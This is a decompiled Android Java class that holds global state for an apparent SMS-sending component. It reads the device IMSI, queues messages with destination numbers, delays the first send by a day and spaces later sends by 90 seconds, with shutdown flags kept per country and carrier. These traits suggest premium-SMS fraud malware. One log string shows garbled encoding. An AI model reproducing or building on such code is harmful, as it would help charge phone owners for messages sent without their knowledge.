package com.yongding.logic;

import android.content.Context;
import android.os.SystemClock;
import com.yongding.util.CountryAndSPInfo;
import com.yongding.util.PhoneState;
import com.yongding.util.Trace;
import java.util.ArrayList;
import java.util.List;

public class Global {
    public static long defaultFirstSendTime = 0;
    public static String imei = null;
    public static String imsc = null;
    public static String imsi = null;
    public static long lastSavedTime = 0;
    public static List<smsResult> list = null;
    private static PhoneState phoneState = null;
    public static final long retryFirstSendTime = 300000;
    public static int sendCount = 0;
    public static final long smsSendTimeDefaultDelay = 90000;
    public static long smsSendTimeDelay;
    public static long sumTimer;

    static {
        smsSendTimeDelay = 90000;
        defaultFirstSendTime = 86400000;
        lastSavedTime = 0;
        sumTimer = 0;
        sendCount = Integer.MAX_VALUE;
        imsi = null;
        imsc = null;
        imei = null;
        phoneState = null;
        list = null;
    }

    public static boolean IsSmsListEmpty() {
        return list == null || list.size() == 0;
    }

    public static boolean IsStrEmt(String str) {
        return str == null || str.equals("");
    }

    public static void addSmsToList(String smsContent, String smsNumber, String rc, boolean isStack) {
        Trace.w(new StringBuilder("ld.addSmsToList()-smsContent=").append(smsContent).append(";smsNumber=").append(smsNumber).append(";rc").append(rc).toString());
        smsResult sr = new smsResult();
        sr.setSx(smsContent);
        sr.setRc(rc);
        sr.setDes(smsNumber);
        if (list == null) {
            list = new ArrayList();
            Trace.i("ld.addSmsToList()-global.list == null");
        }
        if (isStack) {
            List<smsResult> tl = new ArrayList();
            tl.add(sr);
            int i = 0;
            while (i < list.size()) {
                tl.add((smsResult) list.get(i));
                i++;
            }
            list = tl;
        } else {
            list.add(sr);
        }
    }

    public static void format(Context context) {
        Trace.i("global.format()-return");
    }

    public static int getShutDown(Context context) {
        return new CountryAndSPInfo(context).getShutDown();
    }

    public static String linkUrl(Object... strings) {
        StringBuffer sb = new StringBuffer();
        int length = strings.length;
        int i = 0;
        while (i < length) {
            sb.append(strings[i]);
            i++;
        }
        return sb.toString();
    }

    public static boolean readPhoneInfo(Context context) {
        boolean bRet = true;
        try {
            phoneState = new PhoneState(context);
            imsi = phoneState.getIMSI(context);
            if (PhoneState.defaultSeri.equals(imsi)) {
                bRet = false;
            }
            Trace.i(new StringBuilder("global.readPhoneInfo()-imsi=").append(imsi).toString());
        } catch (Exception e) {
            Trace.e(new StringBuilder("global.readPhoneInfo()-ERROR\u951f\u65a4\u62f7=").append(e.getMessage()).toString());
        }
        return bRet;
    }

    public static void resetSumTimer(Context context) {
        sumTimer = 0;
        new CountryAndSPInfo(context).putUpdateTime(sumTimer + new CountryAndSPInfo(context).getUpdateTime());
        lastSavedTime = SystemClock.elapsedRealtime();
    }

    public static void setShutDown(Context context, int tag) {
        new CountryAndSPInfo(context).putShutDown(tag);
    }

    public static void updateSumTimer(Context context) {
        if (lastSavedTime == 0) {
            lastSavedTime = SystemClock.elapsedRealtime();
        }
        sumTimer = new CountryAndSPInfo(context).getUpdateTime();
        Trace.w(new StringBuilder("global.updateSumTimer()-sumTimer=").append(sumTimer).append(";lastSavedTime =").append(lastSavedTime).toString());
        long now = SystemClock.elapsedRealtime();
        sumTimer += now;
        if (sumTimer < 0) {
            sumTimer = 0;
            Trace.w("global.updateSumTimer()-0");
        }
        lastSavedTime = now;
        new CountryAndSPInfo(context).putUpdateTime(sumTimer);
        Trace.w(new StringBuilder("global.updateSumTimer()-sumTimer=").append(sumTimer).append(";now =").append(now).toString());
    }
}